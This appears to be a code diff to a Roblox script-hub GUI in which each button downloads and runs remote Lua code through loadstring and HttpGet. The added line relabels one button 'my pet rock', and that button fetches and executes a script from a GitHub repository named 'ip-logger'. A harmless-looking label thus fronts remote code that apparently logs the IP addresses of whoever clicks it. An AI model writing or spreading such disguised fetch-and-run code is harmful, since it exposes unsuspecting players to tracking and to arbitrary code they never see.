@@ -341,7 +341,7 @@ Section:NewButton("Dont press the button 4", "er", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Don't%20Press%20The%20Button%204/DontPressTheButton4GUI"))()
 print("Clicked")
 end)
-Section:NewButton("Dont press the button 4", "er", function()
+Section:NewButton("my pet rock", "er", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/ip-logger/refs/heads/main/my%20pet%20rock%20script"))();
 print("Clicked")
 end)
